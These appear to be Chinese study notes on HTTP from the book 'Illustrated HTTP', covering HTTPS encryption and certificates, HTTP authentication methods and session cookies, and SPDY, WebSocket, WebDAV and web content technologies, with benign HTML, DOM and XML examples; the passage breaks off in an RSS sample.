以共享密钥方式加密时必须将密钥也发送给对方, 可酒精怎样才能安全的转交? 在互联网上转发密钥时，如果通信被监听那么密钥就可会落入攻击者之手，同时也就失去了加密的意义。另外还得设法安全地保管接收到的密钥。

发送密钥就有被窃听的风险，但不发送，对方就不能解密。再说，密钥若能够安全发送，那数据也应该能安全送达。

**2. 使用两把密钥的公开密钥加密**

公开密钥加密方式很好的解决了共享密钥加密的困难

公开密钥加密使用一对**非对称**的密钥. 一把叫做私有密钥 (private key), 另一把叫公开密钥 (public key). 顾名思义, 任何密钥不能让其他人知道, 而公开密则可以随意发布, 任何人都可以获得.

使用公开密钥加密方式, 发送密文的一方使用对方的公开密钥进行加密处理, 对方收到被加密的信息后, 再使用自己的私有密钥进行解密. 利用这种方式, 不需要发送用来解密的私有密钥, 也不必担心密钥被攻击者窃听而盗走

![[Pasted image 20220920135726.png]]

**3. HTTPS 采用混色加密机制**

HTTPS 采用共享密钥加密和公开密钥加密两者并用的混合加密机制. 若密钥能够实现安全转换, 那么有可能会开率使用公开密钥加密来通信. 但是公开密钥与共享加密密钥相比, 其处理速度要更慢.

所以应充分利用两者各自的优势, 将多种方法组合起来用于通信. 在交换密钥环节使用公开密钥加密方式, 之后的建立通信交换报文阶段使用共享密钥加密方式

![[Pasted image 20220920135909.png]]

**4. 证明公开密钥正确性的证书**

公开密钥加密方式还是存在一些问题的. 那就是无法证明公开密钥本手就是货真价实的公开密钥.

比如, 正准备和某台服务器建立公开密钥加密方式下的通信时, 如何证明收到的公开密钥就是原本预想的那台服务器发行的公开密钥. 或许在公开密钥传输途中, 真正的公开密钥已被攻击者替换掉了.

**为了解决上述问题，可以使用由数字证书认证机构（CA，CertificateAuthority）和其相关机关颁发的公开密钥证书。**

数字证书认证机构处于客户端与服务器双方都可信赖的**第三方机构**的立场上。来介绍一下数字证书认证机构的业务流程。首先，服务器的运营人员向数字证书认证机构提出公开密钥的申请。数字证书认证机构在判明提出申请者的身份之后，会对已申请的公开密钥做数字签名，然后分配这个已签名的公开密钥，并将该公开密钥放入公钥证书后绑定在一起。

服务器会将这份由数字证书认证机构颁发的公钥证书发送给客户端，以进行公开密钥加密方式通信。

公钥证书也可叫做数字证书或直接称为证书。接到证书的客户端可使用数字证书认证机构的公开密钥，对那张证书上的数字签名进行验证，一旦验证通过，客户端便可明确两件事：一，认证服务器的公开密钥的是真实有效的数字证书认证机构。二，服务器的公开密钥是值得信赖的。 

此处认证机关的公开密钥必须安全地转交给客户端。使用通信方式时，如何安全转交是一件很困难的，因此，多数浏览器开发商发布版本时，会事先在内部植入常用认证机关的公开密钥。 

![[Pasted image 20220920140428.png]]

**5. HTTPS 的安全通信机制**

为了更好地理解 HTTPS，我们来观察一下 HTTPS 的通信步骤。

![[Pasted image 20220920140516.png]]

步骤 1： 客户端通过发送 **Client Hello** 报文开始 SSL通信。报文中包含客户端支持的 SSL的指定版本、加密组件（Cipher Suite）列表（所使用的加密算法及密钥长度等）。

步骤 2： 服务器可进行 SSL通信时，会以 **Server Hello** 报文作为应答。和客户端一样，在报文中包含 SSL版本以及加密组件。服务器的加密组件内容是从接收到的客户端加密组件内筛选出来的。 

步骤 3： 之后服务器发送 **Certificate** 报文。报文中包含公开密钥证书。

步骤 4： 最后服务器发送 **Server Hello Done** 报文通知客户端，最初阶段的 SSL握手协商部分结束。 

步骤 5： SSL第一次握手结束之后，客户端以 **Client Key Exchange** 报文作为回应。报文中包含通信加密中使用的一种被称为 Pre-master secret 的随机密码串。该报文已用步骤 3 中的公开密钥进行加密。 

步骤 6： 接着客户端继续发送 **Change Cipher Spec** 报文。该报文会提示服务器，在此报文之后的通信会采用 Pre-master secret 密钥加密。

步骤 7： 客户端发送 **Finished** 报文。该报文包含连接至今全部报文的整体校验值。这次握手协商是否能够成功，要以服务器是否能够正确解密该报文作为判定标准。 

步骤 8： 服务器同样发送 **Change Cipher Spec** 报文。

步骤 9： 服务器同样发送 Finished 报文。

步骤 10： 服务器和客户端的 **Finished** 报文交换完毕之后，SSL连接就算建立完成。当然，通信会受到 SSL的保护。从此处开始进行应用层协议的通信，即发送 HTTP 请求。

步骤 11： 应用层协议通信，即发送 HTTP 响应。

步骤 12： 最后由客户端断开连接。断开连接时，发送 **close_notify** 报文。上图做了一些省略，这步之后再发送 TCP FIN 报文来关闭与 TCP的通信。 

**下面是对整个流程的图解。图中说明了从仅使用服务器端的公开密钥证书（服务器证书）建立 HTTPS 通信的整个过程。** 

![[Pasted image 20220920140817.png]]

**Question: SSL 速度慢吗**

HTTPS 也存在一些问题，那就是当使用 SSL时，它的处理速度会变慢。

SSL的慢分两种。一种是指通信慢。另一种是指由于大量消耗CPU 及内存等资源，导致处理速度变慢。 

和使用 HTTP 相比，网络负载可能会变慢 2 到 100 倍。除去和TCP 连接、发送 HTTP 请求 • 响应以外，还必须进行 SSL通信，因此整体上处理通信量不可避免会增加。 

另一点是 SSL必须进行加密处理。在服务器和客户端都需要进行加密和解密的运算处理。因此从结果上讲，比起 HTTP 会更多地

消耗服务器和客户端的硬件资源，导致负载增强。

针对速度变慢这一问题，并没有根本性的解决方案，我们会使用SSL加速器这种（专用服务器）硬件来改善该问题。该硬件为SSL通信专用硬件，相对软件来讲，能够提高数倍 SSL的计算速度。仅在 SSL处理时发挥 SSL加速器的功效，以分担负载。 

**Question: 为什么不一直使用 HTTPS？**

既然 HTTPS 那么安全可靠，那为何所有的 Web 网站不一直使用HTTPS ？

其中一个原因是，因为与纯文本通信相比，加密通信会消耗更多的CPU 及内存资源。如果每次通信都加密，会消耗相当多的资源，平摊到一台计算机上时，能够处理的请求数量必定也会随之减少。 

特别是每当那些访问量较多的 Web 网站在进行加密处理时，它们所承担着的负载不容小觑。在进行加密处理时，并非对所有内容都

进行加密处理，而是仅在那些需要信息隐藏时才会加密，以节约资源。

要进行 HTTPS 通信，证书是必不可少的。而使用的证书必须向认证机构（CA）购买。证书价格可能会根据不同的认证机构略有不同。通常，一年的授权需要数万日元（现在一万日元大约折合 600 人民币）

## 第七章 确认访问用户身份的认证

某些 Web 页面只想让特定的人浏览，或者干脆仅本人可见。为达到这个目标，必不可少的就是认证功能。下面我们一起来学习一下认证

- HTTP 使用的认证方式 
	-   BASIC认证【基本认证】
	-   DIGEST认证【摘要认证】
	-   SSL客户端认证
	-   FormBase认证【基于表单认证】

### 7.1 BASIC 认证

BASIC 认证（基本认证）是从 HTTP/1.0 就定义的认证方式。即便是现在仍有一部分的网站会使用这种认证方式。是 Web 服务器与通信

客户端之间进行的认证步骤:

![[Pasted image 20220920141454.png]]

步骤 1： 当请求的资源需要 BASIC 认证时，服务器会随状态码 401Authorization Required，返回带 WWW-Authenticate 首部字段的响应。该字段内包含认证的方式（BASIC） 及 Request-URI 安全域字符串（realm）。 

步骤 2： 接收到状态码 401 的客户端为了通过 BASIC 认证，需要将用户 ID 及密码发送给服务器。发送的字符串内容是由用户 ID 和密码构成，两者中间以冒号（:）连接后，再经过 Base64 编码处理。 

步骤 3： 接收到包含首部字段 Authorization 请求的服务器，会对认证信息的正确性进行验证。如验证通过，则返回一条包含 Request-URI资源的响应。 

BASIC 认证虽然采用 Base64 编码方式，但这不是加密处理。不需要任何附加信息即可对其解码。换言之，由于明文解码后就是用户 ID 和密码，在 HTTP 等非加密通信的线路上进行 BASIC 认证的过程中，如果被人窃听，被盗的可能性极高。 

BASIC 认证使用上不够便捷灵活，且达不到多数 Web 网站期望的安全性等级，因此它并不常用。 

### 7.1 DIGEST 认证

为弥补 BASIC 认证存在的弱点, 从 HTTP/1.1 起就有了 DIGEST 认证. DIGEST 认证同样使用质询/响应的方式 (challenge/response), 但不会像 BASIC 认证那样直接发送明文密码

所谓质询响应方式是指，一开始一方会先发送认证要求给另一方，接着使用从另一方那接收到的质询码计算生成响应码。最后将响应码返回给对方进行认证的方式。

DIGEST 认证步骤:

![[Pasted image 20220920141731.png]]

步骤 1： 请求需认证的资源时，服务器会随着状态码 401Authorization Required，返 回带 WWW-Authenticate 首部字段的响应。

该字段内包含质问响应方式认证所需的临时质询码（随机数，nonce）。 

步骤 2： 接收到 401 状态码的客户端，返回的响应中包含 DIGEST 认证必须的首部字段 Authorization 信息。 

步骤 3： 接收到包含首部字段 Authorization 请求的服务器，会确认认证信息的正确性。认证通过后则返回包含 Request-URI 资源的响应。 

并且这时会在首部字段 Authentication-Info 写入一些认证成功的相关信息。

DIGEST 认证提供了高于 BASIC 认证的安全等级，但是和 HTTPS 的客户端认证相比仍旧很弱。DIGEST 认证提供防止密码被窃听的保护机制，但并不存在防止用户伪装的保护机制。 

DIGEST 认证和 BASIC 认证一样，使用上不那么便捷灵活，且仍达不到多数 Web 网站对高度安全等级的追求标准。因此它的适用范围也有所受限。 

### 7.3 SSL 客户端认证

SSL 客户端认证是借由 HTTPS 的客户端证书完成认证的方式. 凭借客户端证书 (在 HTTPS 一章已讲解) 认证, 服务器可确认访问是否已登录的客户端

**7.3.1 SSL客户端认证的认证步骤**

为达到 SSL客户端认证的目的，需要事先将客户端证书分发给客户端，且客户端必须安装此证书。 

步骤 1： 接收到需要认证资源的请求，服务器会发送 CertificateRequest 报文，要求客户端提供客户端证书。

步骤 2： 用户选择将发送的客户端证书后，客户端会把客户端证书信息以 Client Certificate 报文方式发送给服务器。 

步骤 3： 服务器验证客户端证书验证通过后方可领取证书内客户端的公开密钥，然后开始 HTTPS 加密通信。

**7.3.2 SSL 客户端认证采用双因素认证**

在多数情况下，SSL客户端认证不会仅依靠证书完成认证，一般会和基于表单认证（稍后讲解）组合形成一种双因素认证（Two-factor authentication）来使用

所谓双因素认证就是指，认证过程中不仅需要密码这一个因素，还需要申请认证者提供其他持有信息，从而作为另一个因素，与其组合使用的认证方式。

换言之，第一个认证因素的 SSL客户端证书用来认证客户端计算机，另一个认证因素的密码则用来确定这是用户本人的行为。通过双因素认证后，就可以确认是用户本人正在使用匹配正确的计算机访问服务器。 

### 7.4 基于表单认证

基于表单的认证方法并不是在 HTTP 协议中定义的。客户端会向服务器上的 Web 应用程序发送登录信息（Credential），按登录信息的验证结果认证。 

根据 Web 应用程序的实际安装，提供的用户界面及认证方式也各不 相同。

多数情况下，输入已事先登录的用户 ID（通常是任意字符串或邮件 地址）和密码等登录信息后，发送给 Web 应用程序，基于认证结果 来决定认证是否成功。

**7.4.1 认证多半为基于表单认证**

由于使用上的便利性及安全性问题，HTTP 协议标准提供的 BASIC 认 证和 DIGEST 认证几乎不怎么使用。另外，SSL客户端认证虽然具有 高度的安全等级，但因为导入及维持费用等问题，还尚未普及。

比如 SSH 和 FTP 协议，服务器与客户端之间的认证是合乎标准规范 的，并且满足了最基本的功能需求上的安全使用级别，因此这些协议的认证可以拿来直接使用。但是对于 Web 网站的认证功能能够满 足其安全使用级别的标准规范并不存在，所以只好使用由 Web 应用程序各自实现基于表单的认证方式。

**7.4.2 Session 管理及 Cookie 应用**

基于表单认证的标准规范尚未有定论，一般会使用 Cookie 来管理 Session（会话）。

基于表单认证本身是**通过**服务器端的 **Web 应用**，将客户端发送过来的用户 ID 和密码与之前登录过的信息做匹配来进行认证的。

但鉴于 HTTP 是无状态协议，之前已认证成功的用户状态无法通过协 议层面保存下来。即，无法实现状态管理，因此即使当该用户下一次 继续访问，也无法区分他与其他的用户。于是我们会使用 Cookie 来 管理 Session，以弥补 HTTP 协议中不存在的状态管理功能。

![[Pasted image 20220920142411.png]]

步骤 1： 客户端把用户 ID 和密码等登录信息放入报文的实体部分， 通常是以 POST 方法把请求发送给服务器。而这时，会使用 HTTPS 通信来进行 HTML表单画面的显示和用户输入数据的发送。 

步骤 2： 服务器会发放用以识别用户的 **Session ID**。通过验证从客户端发送过来的登录信息进行身份认证，然后把用户的认证状态与 Session ID 绑定后记录在服务器端。 

向客户端返回响应时，会在首部字段 Set-Cookie 内写入 Session ID（如 PHPSESSID=028a8c…）

你可以把 Session ID 想象成一种用以区分不同用户的等位号。 

然而，如果 Session ID 被第三方盗走，对方就可以伪装成你的身份进行恶意操作了。因此必须防止 Session ID 被盗，或被猜出。为了做到 这点，Session ID 应使用难以推测的字符串，且服务器端也需要进行有效期的管理，保证其安全性。 

另外，为减轻跨站脚本攻击（XSS）造成的损失，建议事先在 Cookie 内加上 **httponly** 属性。 

步骤 3： 客户端接收到从服务器端发来的 Session ID 后，会将其作为 **Cookie** 保存在本地。下次向服务器发送请求时，浏览器会自动发送 Cookie，所以 Session ID 也随之发送到服务器。服务器端可通过验证 接收到的 Session ID 识别用户和其认证状态。 

除了以上介绍的应用实例，还有应用其他不同方法的案例。 

另外，不仅基于表单认证的登录信息及认证过程都无标准化的方法， 服务器端应如何保存用户提交的密码等登录信息等也没有标准化。

通常，一种安全的保存方法是，先利用给密码加盐 (salt)  的方式增 加额外信息，再使用散列（hash）函数计算出散列值后保存。但是我们也经常看到直接保存明文密码的做法，而这样的做法具有导致密码泄露的风险。 

> salt 其实就是由服务器随机生成的一个字符串，但是要保证长度足够长，并且是真正随机生成的。然后把它和密码字符串相连接（前后都可以）生成散列值。当两个用户使用了同一个密码时，由于随机生成的 salt 值不同，对应的散列值也将 是不同的。这样一来，很大程度上减少了密码特征，攻击者也就很难利用自己手中的密码特征库进行破解。——译者注

## 第八章 基于 HTTP 的功能追加协议

### 8.1 消除 HTTPS 瓶颈的 SPDY

Google 在 2010 年发布了 SPDY（取自 SPeeDY，发音同 speedy），其开发目标旨在解决 HTTP 的性能瓶颈，缩短 Web 页面的加载时间（50%）。

**8.1.1 HTTP 的瓶颈**

为了尽可能实时地显示这些更新的内容，服务器上一有内容更新，就需要直接把那些内容反馈到客户端的界面上。虽然看起来挺简单的，

但 HTTP 却无法妥善地处理好这项任务。 

使用 HTTP 协议探知服务器上是否有内容更新，就必须频繁地从客户端到服务器端进行确认。如果服务器上没有内容更新，那么就会产生徒劳的通信。

**8.1.2 SPDY 消除 Web 瓶颈了吗**

希望使用 SPDY 时，Web 的内容端不必做什么特别改动，而 Web 浏览器及 Web 服务器都要为对应 SPDY 做出一定程度上的改动。有好几家 Web 浏览器已经针对 SPDY 做出了相应的调整。另外，Web 服务器也进行了实验性质的应用，但把该技术导入实际的 Web 网站却进展不佳。因为 SPDY 基本上只是将单个域名（ IP 地址）的通信多路复用，所以当一个 Web 网站上使用多个域名下的资源，改善效果就会受到限制。

SPDY 的确是一种可有效消除 HTTP 瓶颈的技术，但很多 Web 网站存在的问题并非仅仅是由 HTTP 瓶颈所导致。对 Web 本身的速度提升，还应该从其他可细致钻研的地方入手，比如改善 Web 内容的编写方式等

### 8.2 使用浏览器进行全双工通信的 WebSocket

利用 Ajax 和 Comet 技术进行通信可以提升 Web 的浏览速度。但问题在于通信若使用 HTTP 协议，就无法彻底解决瓶颈问题。WebSocket网络技术正是为解决这些问题而实现的一套新协议及 API。 

**8.2.1 WebSocket 的设计与功能**

WebSocket，即 Web 浏览器与 Web 服务器之间全双工通信标准。其中，WebSocket 协议由 IETF 定为标准，WebSocket API 由 W3C 定为标准。仍在开发中的 WebSocket 技术主要是为了解决 Ajax 和 Comet里 XMLHttpRequest 附带的缺陷所引起的问题。

**8.2.2 WebSocket协议与特点**

一旦 Web 服务器与客户端之间建立起 WebSocket 协议的通信连接，之后所有的通信都依靠这个专用协议进行。通信过程中可互相发送JSON、XML、HTML或图片等任意格式的数据。 

下面我们列举一下 WebSocket 协议的主要特点。

1. **推送功能:** 支持由服务器向客户端推送数据的推送功能。这样，服务器可直接发送数据，而不必等待客户端的请求。 

2. **减少通信量:** 只要建立起 WebSocket 连接，就希望一直保持连接状态。和 HTTP 相比，不但每次连接时的总开销减少，而且由于 WebSocket 的首部信息很小，通信量也相应减少了。

### 8.3 期盼已久的 HTTP/2.0

目前主流的 HTTP/1.1 标准，自 1999 年发布的 RFC2616 之后再未进行过改订。SPDY 和 WebSocket 等技术纷纷出现，很难断言 HTTP/1.1仍是适用于当下的 Web 的协议。 

HTTP/2.0 围绕着主要的 7 项技术进行讨论，现阶段（2012 年 8 月 13日），大都倾向于采用以下协议的技术。但是，讨论仍在持续，所以不能排除会发生重大改变的可能性。 

![[Pasted image 20220920143132.png]]

### 8.4 Web 服务器管理文件的 WebDAV

WebDAV（Web-based Distributed Authoring and Versioning，基于万维网 的分布式创作和版本控制）是一个可对 Web 服务器上的内容直接进 行文件复制、编辑等操作的分布式文件系统。它作为扩展 HTTP/1.1 的协议定义在 RFC4918。

除了创建、删除文件等基本功能，它还具备文件创建者管理、文件编 辑过程中禁止其他用户内容覆盖的加锁功能，以及对文件内容修改的 版本控制功能。

![[Pasted image 20220920143202.png]]

使用 HTTP/1.1 的 PUT 方法和 DELETE 方法，就可以对 Web 服务器 上的文件进行**创建和删除**操作。可是出于安全性及便捷性等考虑，一 般不使用。

**8.5.1 扩展 HTTP/1.1 的 WebDAV**

针对服务器上的资源，WebDAV 新增加了一些概念，如下所示。

![[Pasted image 20220920143244.png]]

- 集合（Collection）：是一种统一管理多个资源的概念。以集合为单位可进行各种操作。也可实现类似集合的集合这样的叠加。 
- 资源（Resource）：把文件或集合称为资源。 
- 属性（Property）：定义资源的属性。定义以“名称 = 值”的格式执 行。 
- 锁（Lock）：把文件设置成无法编辑状态。多人同时编辑时，可 防止在同一时间进行内容写入。

**8.5.2 WebDAV 内新增的方法及状态码**

WebDAV 为实现远程文件管理，向 HTTP/1.1 中追加了以下这些方 法。

- PROPFIND ：获取属性 
- PROPPATCH ：修改属性 
- MKCOL ：创建集合 
- COPY ：复制资源及属性 
- MOVE ：移动资源 
- LOCK ：资源加锁 
- UNLOCK ：资源解锁

为配合扩展的方法，状态码也随之扩展。 

- 102 Processing ：可正常处理请求，但目前是处理中状态 
- 207 Multi-Status ：存在多种状态 
- 422 Unprocessible Entity ：格式正确，内容有误 
- 423 Locked ：资源已被加锁
- 424 Failed Dependency ：处理与某请求关联的请求失败，因此不再维 
- 182 持依赖关系 
- 507 Insufficient Storage ：保存空间不足

WebDAV 的请求实例:

下面是使用 PROPFIND 方法对 http://www.example.com/file 发起 获取属性的请求。
```http
PROPFIND /file HTTP/1.1
Host: www.example.com
Content-Type: application/xml; charset="utf-8"
Content-Length: 219

<?xml version="1.0" encoding="utf-8" ?>
<D:propfind xmlns:D="DAV:">
	<D:prop xmlns:R="http://ns.example.com/boxschema/">
		<R:bigbox/>
		<R:author/>
		<R:DingALing/>
		<R:Random/>
	</D:prop>
</D:propfind>
```

WebDAV 的响应实例:

下面是针对之前的 PROPFIND 方法，返回 http://www.example.com/file 的属性的响应。

```http
HTTP/1.1 207 Multi-Status
Content-Type: application/xml; charset="utf-8"
Content-Length: 831 http://www.example.com/file Box type A

<?xml version="1.0" encoding="utf-8" ?>
<D:multistatus xmlns:D="DAV:">
	<D:response xmlns:R="http://ns.example.com/boxschema/">
			<D:href>http://www.example.com/file</D:href>
			<D:propstat>
				<R:bigbox>
				<R:BoxType>Box type A</R:BoxType>
				</R:bigbox>
				<R:author>
				<R:Name>J.J. Johnson</R:Name>
				</R:author>
			</D:prop>
			<D:status>HTTP/1.1 200 OK</D:status>
		</D:propstat>
		<D:propstat>
<D:prop><R:DingALing/><R:Random/></D:prop>
<D:status>HTTP/1.1 403 Forbidden</D:status>
			<D:responsedescription> The user does not have access to the DingALing property.
			</D:responsedescription>
		</D:propstat>
	</D:response>
	<D:responsedescription> There has been an access violation error.
	</D:responsedescription>
</D:multistatus>
```


> 为何 HTTP 协议受众如此广泛
> 
> 本章讲解了几个与 HTTP 相关联的协议使用案例。为什么 HTTP 协 议受众能够如此广泛呢? 
> 
> 过去，新编写接入互联网的系统或软件时，还需要同时编写实现与必要功能对应的新协议。但最近，使用 HTTP 的系统和软件占了绝大多数。
> 
> 这有着诸多原因，其中与企业或组织的防火墙设定有着莫大的关系。防火墙的基本功能就是禁止非指定的协议和端口号的数据包通过。因此如果使用新协议或端口号则必须修改防火墙设置。 
> 
> 互联网上，使用率最高的当属 Web。不管是否具备访问 FTP 和 SSH 的权限，一般公司都会开放对 Web 的访问。Web 是基于 HTTP 协议运作的，因此在构建 Web 服务器或访问 Web 站点时，需事先设置防火墙 HTTP（80/tcp）和 HTTPS（443/tcp）的权限。 
> 
> 许多公司或组织已设定权限将 HTTP 作为通信环境，因此无须再修改防火墙的设定。可见 HTTP 具有导入简单这一大优势。而这也是基于 HTTP 服务或内容不断增加的原因之一。 
> 
> 还有一些其他原因，比如，作为 HTTP 客户端的浏览器已相当普遍，HTTP 服务器的数量已颇具规模，HTTP 本身就是优异的应用等。

## 第九章 构建 Web 内容的技术

### 9.1 HTML

**9.1.1 Web页面几乎全由 HTMl 构建**

HTML（HyperText Markup Language，超文本标记语言）是为了发送 Web 上的超文本（Hypertext）而开发的标记语言。超文本是一种文档系统，可将文档中任意位置的信息与其他信息（文本或图片等）建立关联，即超链接文本。标记语言是指通过在文档的某部分穿插特别的字符串标签，用来修饰文档的语言。我们把出现在 HTML文档内的 这种特殊字符串叫做 HTML标签（Tag）。

平时我们浏览的 Web 页面几乎全是使用 HTML写成的。由 HTML构 成的文档经过浏览器的解析、渲染后，呈现出来的结果就是 Web 页 面。

以下就是用 HTML编写的文档的例子。而这份 HTML文档内这种被 < > 包围着的文字就是标签。在标签的作用下，文档会改变样式，或插 入图片、链接。

```html
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>hackr.jp</title>
<style type="text/css">
.logo {
		padding: 20px;
		text-align: center;
}
</style>
</head>

<body>
<div class="logo">
		<p><img src="photo.jpg" alt="photo" width="240" height="127" /></p>
		<p><img src="hackr.gif" alt="hackr.jp" width="240" height="84" /></p>
		<p><a href="http://hackr.jp/">hackr.jp</a> </p>
</div>
</body>
</html>
```
**9.1.2 HTMl 的版本**

目前的最新版本是 HTML5 标准

HTML5 标准不仅解决了浏览器之间的兼容性问题，并且可把文本作 为数据对待，更容易复用，动画等效果也变得更生动。

时至今日，HTML仍存在较多悬而未决问题。有些浏览器未遵循 HTML标准实现，或扩展自用标签等，这都反映了 HTML的标准实际 上尚未统一这一现状。

**9.1.3 设计应用 CSS**

CSS（Cascading Style Sheets，层叠样式表）可以指定如何展现 HTML 内的各种元素，属于样式表标准之一。即使是相同的 HTML文档， 通过改变应用的 CSS，用浏览器看到的页面外观也会随之改变。CSS 的理念就是让文档的结构和设计分离，达到解耦的目的。

CSS 实例

```css
.logo {
		padding: 20px;
		text-align: center;
}
```

可在**选择器**（selector）`.logo` 的指定范围内，使用 {} 括起来的声明块 中写明的 `padding: 20px` 等声明语句应用指定的样式。 可通过指定 HTML元素或特定的 `class`、`ID` 等作为选择器来限定样式 的应用范围。

### 9.2 动态 HTML

**9.2.1 让 Web 页面动起来的动态 HTMl**

所谓动态 HTML（Dynamic HTML），是指使用客户端脚本语言将静态的 HTML 内容变成动态的技术的总称。鼠标单击点开的新闻、 Google Maps 等可滚动的地图就用到了动态 HTML。

动态 HTML技术是通过调用客户端脚本语言 **JavaScript**，实现对 HTML的 Web 页面的动态改造。利用 DOM（Document Object Model，文档对象模型）可指定欲发生动态变化的 HTML元素。

**9.2.2 更易控制 HTML 的 DOM**

DOM 是用以操作 HTML 文档和 XML 文档的 API（Application Programming Interface，应用编程接口）。使用 DOM 可以将 HTML 内的元素当作对象操作，如取出元素内的字符串、改变那个 CSS 的属 性等，使页面的设计发生改变。

通过调用 JavaScript 等脚本语言对 DOM 的操作，可以以更为简单的方式控制 HTML 的改变。

```html
<body>
		<h1>繁琐的Web安全</h1>
		<p>第Ⅰ部分 Web的构成元素</p>
		<p>第Ⅱ部分 浏览器的安全功能</p>
		<p>第Ⅲ部分 接下来发生的事</p>
</body>
```

比如，从 JavaScript 的角度来看，将上述 HTML文档的第 3 个 P 元素 （P 标签）改变文字颜色时，会像下方这样编写代码。

```html
<script type="text/javascript">
		var content = document.getElementsByTagName('P'); 
		content[2].style.color = '#FF0000';
</script>
```

1. `document.getElementsByTagName('P')` 语句调用 `getElementsByTagName` 函数,从整个 HTML文档 `(document object)` 内取出 P 元素
2. 接下来 的 `content[2].style.color = '#FF0000'` 语句指定 `content` 的索引为 2（第 3 个）的元素的样式颜色改为红色（#FF0000）

DOM 内存在各种函数，使用它们可查阅 HTML中的各个元素。

### 9.3 Web 应用

**9.3.1 通过 Web 提供功能的 Web 应用**

Web 应用是指通过 Web 功能提供的应用程序。比如购物网站、网上 银行、SNS、BBS、搜索引擎和 e-learning 等。互联网（Internet）或企 业内网（Intranet）上遍布各式各样的 Web 应用。

原本应用 HTTP 协议的 Web 的机制就是对客户端发来的请求，返回事前准备好的内容。可随着 Web 越来越普及，仅靠这样的做法已不 足以应对所有的需求，更需要引入由程序创建 HTML内容的做法。

类似这种由程序创建的内容称为动态内容，而事先准备好的内容称为静态内容。Web 应用则作用于动态内容之上。

![[Pasted image 20220920161405.png]]

**9.3.2 与 Web 服务器及程序协作的 CGI**

CGI（Common Gateway Interface，通用网关接口）是指 Web 服务器在接收到客户端发送过来的请求后转发给程序的一组机制。在 CGI 的作用下，程序会对请求内容做出相应的动作，比如创建 HTML等动态内容。

使用 CGI 的程序叫做 CGI 程序，通常是用 Perl、PHP、Ruby 和 C 等 编程语言编写而成。

![[Pasted image 20220920161514.png]]

**9.3.3 因 Java 而普及的 Servlet**

Servlet 是一种能在服务器上创建动态内容的程序。Servlet 是用 Java 语言实现的一个接口，属于面向企业级 Java（JavaEE，Java Enterprise Edition）的一部分。

> Servlet 没有对应中文译名，全称是 Java Servlet。名称取自 Servlet=Server+Applet，表示 轻量服务程序。——译者注

之前提及的 CGI，由于每次接到请求，程序都要跟着启动一次。因此 一旦访问量过大，Web 服务器要承担相当大的负载。而 Servlet 运行 在与 Web 服务器相同的进程中，因此受到的负载较小。Servlet 的运 行环境叫做 Web 容器或 Servlet 容器。

> Servlet 常驻内存，因此在每次请求时，可启动相对进程级别更为轻量的Servlet，程序的执行效率从而变得更高。——译者注

Servlet 作为解决 CGI 问题的对抗技术，随 Java 一起得到了普及。

> 说对抗的原因在于，这个方向上已存在用 Perl 编写的 CGI，实现在 Apache HTTP Server 上内置 mod_php 模块后可运行 PHP 程序、微软主导的 ASP 等技术。 ——译者注

随着 CGI 的普及，每次请求都要启动新 CGI 程序的 CGI 运行机制逐 渐变成了性能瓶颈，所以之后 Servlet 和 mod_perl 等可直接在 Web 服 务器上运行的程序才得以开发、普及。

### 9.4 数据发布的格式及语言

**9.4.1 可拓展标记语言**

XML（eXtensible Markup Language，可扩展标记语言）是一种可按应用目标进行扩展的通用标记语言。旨在通过使用 XML，使互联网数 据共享变得更容易。

XML和 HTML都是从标准通用标记语言 SGML（Standard Generalized Markup Language）简化而成。与 HTML相比，它对数据的记录方式做了特殊处理。

下面我们以 HTML编写的某公司的研讨会议议程为例进行说明。

```html
<html>
<head>
<title>T公司研讨会介绍</title>
</head>
<body>
<h1>T公司研讨会介绍</h1>
<ul>
	<li>研讨会编号：TR001
		<ul>
			<li>Web应用程序脆弱性诊断讲座</li>
		</ul>
	</li>
	<li>研讨会编号：TR002
		<ul>
			<li>网络系统脆弱性诊断讲座</li>
		</ul>
	</li>
</ul>
</body>
</html>
```

用浏览器打开该文档时，就会显示排列的列表内容，但如果这些数据被其他程序读取会发生什么？某些程序虽然具备可通过识别布局特征取出文本的方法，但这份 HTML的样式一旦改变，要读取数据内容 也就变得相对困难了。可见，为了保持数据的正确读取，HTML不适 合用来记录数据结构。

接着将这份列表以 XML的形式改写就成了以下的示例。

```html
<研讨会 编号="TR001" 主题="Web应用程序脆弱性诊断讲座">
	<类别>安全</类别>
	<概要>为深入研究Web应用程序脆弱性诊断必要的…</概要>
</研讨会>
<研讨会 编号="TR002" 主题="网络系统脆弱性诊断讲座">
	<类别>安全</类别>
	<概要>为深入研究网络系统脆弱性诊断必要的…</概要>
</研讨会>
```

XML和 HTML一样，使用标签构成树形结构，并且可自定义扩展标签.

从 XML 文档中读取数据比起 HTML更为简单。由于 XML 的结构基本上都是用标签分割而成的树形结构，因此通过语法分析器 （Parser）的解析功能解析 XML结构并取出数据元素，可更容易地对 数据进行读取。

更容易地复用数据使得 XML在互联网上被广泛接受。比如，可用在 2 个不同的应用之间的交换数据格式化。

**9.4.2 发布更新信息的 RSS/Atom**

RSS（简易信息聚合，也叫聚合内容）和 Atom 都是发布新闻或博客 日志等更新信息文档的格式的总称。两者都用到了 XML。

RSS 有以下版本，名称和编写方式也不相同。

- RSS 0.9（RDFSite Summary）：最初的 RSS 版本。1999 年 3 月由网 景通信公司自行开发用于其门户网站。基础构图创建在初期的 RDF 规格上。 
- RSS 0.91（Rich Site Summary）：在 RSS0.9 的基础上扩展元素，于 1999 年 7 月开发完毕。非 RDF 规格，使用 XML方式编写。 RSS 1.0（RDFSite Summary）：RSS 规格正处于混乱状态。2000 年 12 月由 RSS-DEV 工作组再次采用 RSS0.9 中使用的 RDF 规格发布。 
- RSS2.0（Really Simple Syndication）：非 RSS1.0 发展路线。增加支 持 RSS0.91 的兼容性，2000 年 12 月由 UserLand Software 公司开发完 成。

Atom 具有以下两种标准。

- Atom 供稿格式（Atom Syndication Format）：为发布内容而制定的 网站消息来源格式，单讲 Atom 时，就是指此标准。 
- Atom 出版协定（Atom Publishing Protocol）：为 Web 上内容的新增 或修改而制定的协议。

用于订阅博客更新信息的 RSS 阅读器，这种应用几乎支持 RSS 的所 有版本以及 Atom。

RSS1.0 示例

```rss
<?xml version="1.0" encoding="utf-8" ?>
<?xml-stylesheet href="http://d.hatena.ne.jp/sen-u/rssxsl" type="text/xsl" media="screen"?>
<rdf:RDF
xmlns="http://purl.org/rss/1.0/"
xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
xmlns:content="http://purl.org/rss/1.0/modules/content/"
xmlns:dc="http://purl.org/dc/elements/1.1/"
xml:lang="ja">
